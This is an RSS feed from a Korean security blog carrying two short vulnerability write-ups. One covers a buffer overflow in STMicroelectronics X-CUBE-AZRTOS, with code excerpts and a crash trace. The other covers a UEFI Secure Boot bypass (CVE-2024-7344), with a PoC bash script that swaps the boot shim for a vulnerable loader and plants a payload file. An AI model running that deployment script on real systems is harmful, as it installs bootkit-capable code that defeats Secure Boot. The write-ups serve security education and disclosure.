<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Wed, 28 May 2025 01:55:20 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2024-45064: X-CUBE-AZRTOS에서 발생한 Buffer Overflow 취약점</title>
      <link>https://hackyboiz.github.io/2025/05/28/ogu123/cve-2024-45064/</link>
      <guid>https://hackyboiz.github.io/2025/05/28/ogu123/cve-2024-45064/</guid>
      <pubDate>Wed, 28 May 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.talosintelligence.com/vulnerability_rep</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.talosintelligence.com/vulnerability_reports/TALOS-2024-2096">https://www.talosintelligence.com/vulnerability_reports/TALOS-2024-2096</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>STMicroelectronics X-CUBE-AZRT-H7RS 1.0.0</li><li>STMicroelectronics X-CUBE-AZRTOS-F7 1.1.0</li><li>STMicroelectronics X-CUBE-AZRTOS-F4 1.1.0</li><li>STMicroelectronics X-CUBE-AZRTOS-G0 1.1.0</li><li>STMicroelectronics X-CUBE-AZRTOS-G4 2.0.0</li><li>STMicroelectronics X-CUBE-AZRTOS-L4 2.0.0</li><li>STMicroelectronics X-CUBE-AZRTOS-L5 2.0.0</li><li>STMicroelectronics X-CUBE-AZRTOS-WB 2.0.0</li><li>STMicroelectronics X-CUBE-AZRTOS-WL 2.0.0</li><li>STMicroelectronics X-CUBE-AZRTOS-H7 3.3.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>STMicroelectronics &#xC0AC;&#xC758; X-CUBE-AZRTOS &#xC81C;&#xD488;&#xC5D0;&#xC11C; buffer overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; RAM &#xB514;&#xC2A4;&#xD06C;&#xB97C; &#xC124;&#xC815;&#xD560; &#xB54C; &#xC2E4;&#xC81C; &#xD560;&#xB2F9;&#xB418;&#xB294; RAM &#xB514;&#xC2A4;&#xD06C; size&#xC640; &#xC139;&#xD130; &#xC218;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk">status = fx_media_format(&amp;ram_disk,    fx_stm32_sram_driver,                <span class="hljs-regexp">//</span> Driver entry                demo.ram_disk_memory,    <span class="hljs-regexp">//</span> RAM disk memory pointer   <span class="hljs-regexp">/*[1] size 4096*/</span>                DataBuffer,              <span class="hljs-regexp">//</span> Media buffer pointer                sizeof(DataBuffer),      <span class="hljs-regexp">//</span> Media buffer size                <span class="hljs-string">&quot;MY_RAM_DISK&quot;</span>,                <span class="hljs-regexp">//</span> Volume Name                <span class="hljs-number">1</span>,                            <span class="hljs-regexp">//</span> Number of FATs                <span class="hljs-number">32</span>,                           <span class="hljs-regexp">//</span> Directory Entries                <span class="hljs-number">0</span>,                            <span class="hljs-regexp">//</span> Hidden sectors                <span class="hljs-number">256</span>,                          <span class="hljs-regexp">//</span> Total sectors    <span class="hljs-regexp">/*[2]*/</span>                <span class="hljs-number">512</span>,                          <span class="hljs-regexp">//</span> Sector size      <span class="hljs-regexp">/*[3]*/</span>                <span class="hljs-number">8</span>,                            <span class="hljs-regexp">//</span> Sectors per cluster                <span class="hljs-number">1</span>,                            <span class="hljs-regexp">//</span> Heads                <span class="hljs-number">1</span>);                           <span class="hljs-regexp">//</span> Sectors per track</code></pre><p>&#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC2DC;&#xC791;&#xB420; &#xB54C;, RAM &#xB514;&#xC2A4;&#xD06C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; <code>fx_media_format</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xCD08;&#xAE30;&#xD654;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C; RAM &#xB514;&#xC2A4;&#xD06C; size&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xBA74; [2] Total sectors(256) x [3] Sector size(512) = 131,072 byte&#xC774;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C; &#xD560;&#xB2F9;&#xC740; [1] size 4096 byte &#xB9CC;&#xD07C; &#xD560;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs xl">File: nx_web_http_server.c<span class="hljs-number">4213</span>: VOID  _nx_web_http_server_put_process(NX_WEB_HTTP_SERVER *server_ptr, NX_PACKET *packet_ptr)<span class="hljs-number">4214</span>: {...<span class="hljs-number">4481</span>:         <span class="hljs-comment">/* Write the content found in this packet.  */</span><span class="hljs-number">4482</span>:         <span class="hljs-function"><span class="hljs-title">status</span> =  fx_file_write(&amp;(server_ptr -&gt;</span> <span class="hljs-function"><span class="hljs-title">nx_web_http_server_file</span>), (packet_ptr -&gt;</span> nx_packet_prepend_ptr + offset),<span class="hljs-number">4483</span>:                                 ((ULONG)(<span class="hljs-function"><span class="hljs-title">packet_ptr</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">nx_packet_append_ptr</span> - packet_ptr -&gt;</span> nx_packet_prepend_ptr) - offset));</code></pre><p>NetXDuo HTTP &#xC11C;&#xBC84;&#xB294; <code>PUT</code> &#xC694;&#xCCAD;&#xC744; &#xBC1B;&#xC73C;&#xBA74;, &#xD30C;&#xC77C; &#xB0B4;&#xC6A9;&#xC744; write &#xD558;&#xAE30; &#xC704;&#xD574; <code>fx_file_write</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript">File: fx_stm32_sram_driver.c<span class="hljs-number">81</span>:         <span class="hljs-keyword">case</span> FX_DRIVER_WRITE:<span class="hljs-number">82</span>:         {<span class="hljs-number">83</span>: <span class="hljs-number">84</span>:             <span class="hljs-comment">/* Calculate the RAM disk sector offset */</span><span class="hljs-number">85</span>:             destination_buffer =  (UCHAR *)FX_SRAM_DISK_BASE_ADDRESS +  <span class="hljs-comment">// [4]</span><span class="hljs-number">86</span>:                                   ((media_ptr-&gt;fx_media_driver_logical_sector +  media_ptr-&gt;fx_media_hidden_sectors) * media_ptr-&gt;fx_media_bytes_per_sector);   <span class="hljs-number">87</span>: <span class="hljs-number">88</span>:             <span class="hljs-comment">/* Copy the source to the RAM sector.  */</span><span class="hljs-number">89</span>:             _fx_utility_memory_copy(media_ptr-&gt;fx_media_driver_buffer, destination_buffer,<span class="hljs-number">90</span>:                                     media_ptr-&gt;fx_media_driver_sectors * media_ptr-&gt;fx_media_bytes_per_sector); <span class="hljs-number">91</span>: <span class="hljs-number">92</span>:             <span class="hljs-comment">/* Successful driver request.  */</span><span class="hljs-number">93</span>:             media_ptr -&gt; fx_media_driver_status =  FX_SUCCESS;<span class="hljs-number">94</span>:             <span class="hljs-keyword">break</span>;<span class="hljs-number">95</span>:         }</code></pre><p><code>fx_file_write</code> &#xD568;&#xC218; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; fx_stm32_sram_driver.c &#xD30C;&#xC77C;&#xC5D0; &#xC788;&#xB294; RAM &#xB514;&#xC2A4;&#xD06C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; <code>FX_DRIVER_WRITE</code>&#xC744; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>FX_DRIVER_WRITE</code>&#xC740; destination_buffer&#xC744; &#xACC4;&#xC0B0;&#xD574; &#xD30C;&#xC77C; &#xB370;&#xC774;&#xD130;&#xB97C; RAM &#xB514;&#xC2A4;&#xD06C;&#xC5D0; write &#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; [4] destination_buffer &#xC8FC;&#xC18C;&#xB97C; &#xACC4;&#xC0B0;&#xD560; &#xB54C;, media_ptr-&gt;fx_media_driver_logical_sector &#xAC12;&#xC774;  Total sectors &#xC218;(256) &#xB9CC;&#xD07C; &#xC99D;&#xAC00;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; [1]&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xB41C; 4096 byte&#xB97C; &#xB118;&#xC5B4; buffer overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript">File: fx_utility_memory_copy.c<span class="hljs-number">82</span>: VOID  _fx_utility_memory_copy(UCHAR *source_ptr, UCHAR *dest_ptr, ULONG size)<span class="hljs-number">83</span>: {<span class="hljs-number">84</span>: <span class="hljs-number">85</span>:     <span class="hljs-comment">/* Copy the memory.  */</span><span class="hljs-number">86</span>:     memcpy(dest_ptr, source_ptr, size); <span class="hljs-comment">/* Use case of memcpy is verified. */</span><span class="hljs-number">87</span>: }</code></pre><p><code>_fx_utility_memory_copy</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB3C4; &#xAC80;&#xC99D; &#xC5C6;&#xC774; <code>memcpy</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">Program</span> received signal SIGTRAP, Trace/breakpoint trap.<span class="hljs-attribute">MemManage_Handler</span> () at ../Core/Src/stm<span class="hljs-number">32</span>f<span class="hljs-number">7</span>xx_it.c:<span class="hljs-number">102</span><span class="hljs-attribute">102</span>{<span class="hljs-attribute">bt</span><span class="hljs-comment">#0  MemManage_Handler () at ../Core/Src/stm32f7xx_it.c:102</span><span class="hljs-comment">#1  &lt;signal handler called&gt;</span><span class="hljs-comment">#2  0x41414140 in ?? ()</span><span class="hljs-comment">#3  0x0802662e in webserver_request_notify_callback (server_ptr=0x20004330 &lt;HTTPServer&gt;, request_type=1, resource=0x2000433c &lt;HTTPServer+12&gt; &quot;/test.txt&quot;, packet_ptr=0x20064558 &lt;nx_byte_pool_buffer+9560&gt;) at ../NetXDuo/App/app_netxduo.c:477</span><span class="hljs-comment">#4  0x08012158 in _nx_web_http_server_get_process (server_ptr=0x20004330 &lt;HTTPServer&gt;, request_type=1, packet_ptr=0x20064558 &lt;nx_byte_pool_buffer+9560&gt;) at ../Middlewares/ST/netxduo/addons/web/nx_web_http_server.c:3778</span><span class="hljs-comment">#5  0x08011a08 in _nx_web_http_server_receive_data (tcpserver_ptr=0x20004578 &lt;HTTPServer+584&gt;, session_ptr=0x200047e4 &lt;HTTPServer+1204&gt;) at ../Middlewares/ST/netxduo/addons/web/nx_web_http_server.c:3128</span><span class="hljs-comment">#6  0x080110b2 in _nx_tcpserver_data_process (server_ptr=0x20004578 &lt;HTTPServer+584&gt;) at ../Middlewares/ST/netxduo/addons/web/nx_tcpserver.c:1048</span><span class="hljs-comment">#7  0x08011284 in _nx_tcpserver_thread_entry (tcpserver_address=536888696) at ../Middlewares/ST/netxduo/addons/web/nx_tcpserver.c:1307</span><span class="hljs-comment">#8  0x08023ff4 in _tx_thread_shell_entry () at ../Middlewares/ST/threadx/common/src/tx_thread_shell_entry.c:114</span><span class="hljs-comment">#9  &lt;signal handler called&gt;</span><span class="hljs-attribute">i</span> r<span class="hljs-attribute">r0</span>             <span class="hljs-number">0</span>x<span class="hljs-number">2</span>d                <span class="hljs-number">45</span><span class="hljs-attribute">r1</span>             <span class="hljs-number">0</span>x<span class="hljs-number">8028742</span>           <span class="hljs-number">134383426</span><span class="hljs-attribute">r2</span>             <span class="hljs-number">0</span>x<span class="hljs-number">74</span>                <span class="hljs-number">116</span><span class="hljs-attribute">r3</span>             <span class="hljs-number">0</span>x<span class="hljs-number">41414141</span>          <span class="hljs-number">1094795585</span><span class="hljs-attribute">r4</span>             <span class="hljs-number">0</span>x<span class="hljs-number">200781</span>e<span class="hljs-number">4</span>          <span class="hljs-number">537362916</span><span class="hljs-attribute">r5</span>             <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">r6</span>             <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">r7</span>             <span class="hljs-number">0</span>x<span class="hljs-number">200781</span>d<span class="hljs-number">8</span>          <span class="hljs-number">537362904</span><span class="hljs-attribute">r8</span>             <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">r9</span>             <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">r10</span>            <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">r11</span>            <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">r12</span>            <span class="hljs-number">0</span>x<span class="hljs-number">80000000</span>          -<span class="hljs-number">2147483648</span><span class="hljs-attribute">sp</span>             <span class="hljs-number">0</span>x<span class="hljs-number">2007</span>ffc<span class="hljs-number">8</span>          <span class="hljs-number">0</span>x<span class="hljs-number">2007</span>ffc<span class="hljs-number">8</span><span class="hljs-attribute">lr</span>             <span class="hljs-number">0</span>xfffffffd          -<span class="hljs-number">3</span><span class="hljs-attribute">pc</span>             <span class="hljs-number">0</span>x<span class="hljs-number">80011</span>f<span class="hljs-number">0</span>           <span class="hljs-number">0</span>x<span class="hljs-number">80011</span>f<span class="hljs-number">0</span> &lt;MemManage_Handler&gt;<span class="hljs-attribute">xpsr</span>           <span class="hljs-number">0</span>x<span class="hljs-number">21000004</span>          <span class="hljs-number">553648132</span><span class="hljs-attribute">fpscr</span>          <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">msp</span>            <span class="hljs-number">0</span>x<span class="hljs-number">2007</span>ffc<span class="hljs-number">8</span>          <span class="hljs-number">0</span>x<span class="hljs-number">2007</span>ffc<span class="hljs-number">8</span><span class="hljs-attribute">psp</span>            <span class="hljs-number">0</span>x<span class="hljs-number">20078198</span>          <span class="hljs-number">0</span>x<span class="hljs-number">20078198</span> &lt;nx_byte_pool_buffer+<span class="hljs-number">90520</span>&gt;<span class="hljs-attribute">primask</span>        <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">basepri</span>        <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">faultmask</span>      <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span><span class="hljs-attribute">control</span>        <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                 <span class="hljs-number">0</span></code></pre><p>&#xB530;&#xB77C;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xB9CE;&#xC740; put &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; &#xC139;&#xD130; &#xC218;&#xB97C; &#xC99D;&#xAC00;&#xC2DC;&#xCF1C; buffer overflow &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bof/">bof</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/STMicroelectronics/">STMicroelectronics</category>
      
      <category domain="https://hackyboiz.github.io/tags/X-CUBE-AZRTOS/">X-CUBE-AZRTOS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/28/ogu123/cve-2024-45064/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-7344 : Howyar Reloader UEFI 애플리케이션의 서명 검증 없는 임의 코드 실행으로 인한 Secure Boot bypass</title>
      <link>https://hackyboiz.github.io/2025/05/21/newp1ayer48/CVE-2024-7344/</link>
      <guid>https://hackyboiz.github.io/2025/05/21/newp1ayer48/CVE-2024-7344/</guid>
      <pubDate>Wed, 21 May 2025 04:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.bleepingcomputer.com/news/security/new-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.bleepingcomputer.com/news/security/new-uefi-secure-boot-flaw-exposes-systems-to-bootkits-patch-now/">https://www.bleepingcomputer.com/news/security/new-uefi-secure-boot-flaw-exposes-systems-to-bootkits-patch-now/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>SysReturn 10.2.02320240919 &#xC774;&#xD558; &#xBC84;&#xC804; &#xB4F1;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Howyar Reloader UEFI &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB41C; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xBC0F; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>UEFI &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; OS &#xBD80;&#xD305; &#xC804;&#xC5D0; &#xC2E4;&#xD589;&#xB418;&#xB294; Bootloader&#xC758; &#xC720;&#xD615;&#xC73C;&#xB85C; BIOS&#xC758; &#xBC1C;&#xC804;&#xB41C; &#xD615;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>UEFI &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; Microsoft UEFI &#xC778;&#xC99D; &#xAE30;&#xAD00;(CA)&#xC5D0;&#xC11C; &#xB514;&#xC9C0;&#xD138; &#xC11C;&#xBA85;&#xC744; &#xBC1B;&#xC544; UEFI &#xBCF4;&#xC548; &#xBD80;&#xD305; &#xCD94;&#xAC00; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xB294; &#xD615;&#xD0DC;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. UEFI &#xBD80;&#xD2B8;&#xB85C;&#xB354;&#xB294; &#xCD08;&#xAE30; &#xBD80;&#xD305; &#xAD00;&#xB9AC;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xC5EC; OS &#xD30C;&#xC77C;&#xC744; &#xBCF4;&#xD638;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC5D0; &#xB85C;&#xB4DC;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>ESET &#xC5F0;&#xAD6C;&#xC6D0;&#xB4E4;&#xC740; &#xC774; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC11C;&#xBA85; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB41C; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; UEFI &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC11C;&#xBA85;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBAA8;&#xB4E0; &#xD0C0;&#xC0AC; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; UEFI &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xB192;&#xC740; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xCD08;&#xAE30; &#xBD80;&#xD305; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xBB38;&#xC81C;&#xB294; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC0AC;&#xC6A9;&#xC790; &#xC9C0;&#xC815; PE loader&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC5D0;&#xC11C; &#xBE44;&#xB86F;&#xB418;&#xB294;&#xB370;, &#xC774; &#xB54C;&#xBB38;&#xC5D0; &#xC11C;&#xBA85;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBAA8;&#xB4E0; UEFI &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xB610;&#xD55C;, <code>reloader.efi</code>&#xAC00; &#xC548;&#xC804;&#xD55C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xC2E4;&#xD589;&#xC744; &#xC704;&#xD574; DB&#xB97C; &#xD1B5;&#xD55C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB294; UEFI&#xC758; &#xD45C;&#xC900; BootServices <code>LoadImage()</code>, <code>StartImage()</code> API&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.<br><img src="/2025/05/21/newp1ayer48/CVE-2024-7344/image1.png" alt></p><p>PoC&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>reloader.efi</code>&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC554;&#xD638;&#xD654;&#xB41C; XOR PE &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; <code>cloak.dat</code>&#xC5D0;&#xC11C; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xC554;&#xD638;&#xB97C; &#xD574;&#xB3C5;&#xD558;&#xACE0; &#xBA54;&#xBAA8;&#xB9AC; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xC548;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xC5EC; EFI &#xD30C;&#xD2F0;&#xC158;&#xC758; &#xC571; &#xAE30;&#xBCF8; OS Boot loader&#xB97C; &#xCDE8;&#xC57D;&#xD55C; <code>reloader.efi</code>&#xB85C; &#xBC14;&#xAFB8;&#xACE0; &#xBA85;&#xBAA9; &#xACBD;&#xB85C;&#xC5D0; &#xC545;&#xC131; <code>cloak.dat</code> &#xD30C;&#xC77C;&#xC744; &#xC2EC;&#xC5B4; &#xB193;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2DC;&#xC2A4;&#xD15C; &#xBD80;&#xD305; &#xC2DC;, &#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xC758; &#xB85C;&#xB354;&#xB294; &#xBCF4;&#xC548; &#xBD80;&#xD305; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xC545;&#xC131; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xD574;&#xB3C5;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs bash"><span class="hljs-comment">##############################</span><span class="hljs-comment"># check UEFI Secure Boot status</span><span class="hljs-comment"># mokutil --sb-state</span><span class="hljs-comment"># check installed UEFI db certificates</span><span class="hljs-comment"># mokutil --db | grep &quot;Subject:&quot; | sed -E &apos;s/.*CN=//&apos;</span><span class="hljs-comment"># check dbx version</span><span class="hljs-comment"># sudo fwupdmgr get-devices 2&gt; /dev/null | grep -A 6 &quot;UEFI dbx&quot; | head -n 6</span><span class="hljs-comment">## Deploy files to exploit CVE-2024-7344 ####</span><span class="hljs-comment">##############################</span>ESP=<span class="hljs-string">&quot;/boot/efi/EFI&quot;</span>VULN_APP=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/poc/reloader.efi&quot;</span>PAYLOAD=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/poc/cloak.dat&quot;</span><span class="hljs-comment"># backup shim</span>sudo cp <span class="hljs-string">&quot;<span class="hljs-variable">$ESP</span>/ubuntu/shimx64.efi&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$ESP</span>/ubuntu/shimx64-orig.efi&quot;</span><span class="hljs-comment">#deploy vulnerable UEFI App and payload file</span>sudo cp <span class="hljs-string">&quot;<span class="hljs-variable">$VULN_APP</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$ESP</span>/ubuntu/shimx64.efi&quot;</span>sudo cp <span class="hljs-string">&quot;<span class="hljs-variable">$PAYLOAD</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$ESP</span>/boot/cloak.dat&quot;</span>sleep 3sudo reboot</code></pre></p><p>&#xC7AC;&#xBD80;&#xD305;&#xC774; &#xB418;&#xBA74; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><img src="/2025/05/21/newp1ayer48/CVE-2024-7344/image2.png" alt></p><p>CVE-2024-7344 &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB300;&#xC0C1; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0; &#xC704; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC5C6;&#xB354;&#xB77C;&#xB3C4;, &#xCDE8;&#xC57D;&#xD55C; <code>reloader.efi</code> &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB9CC; &#xBC30;&#xD3EC;&#xD558;&#xC5EC; &#xACF5;&#xACA9;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; UEFI Revocation List File &#xD328;&#xCE58;&#xB97C; &#xD1B5;&#xD574; &#xCC28;&#xB2E8;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C;, Microsoft &#xCE21;&#xC5D0;&#xC11C;&#xB294; 2025&#xB144; 1&#xC6D4; 14&#xC77C;&#xC5D0; &#xCDE8;&#xC57D;&#xD55C; UEFI &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xC778;&#xC99D;&#xC11C;&#xB97C; &#xD3D0;&#xC9C0;&#xD558;&#xC5EC; &#xCC28;&#xB2E8;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xD328;&#xCE58;&#xB294; Windows &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xC124;&#xCE58;&#xD55C; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC801;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><h2 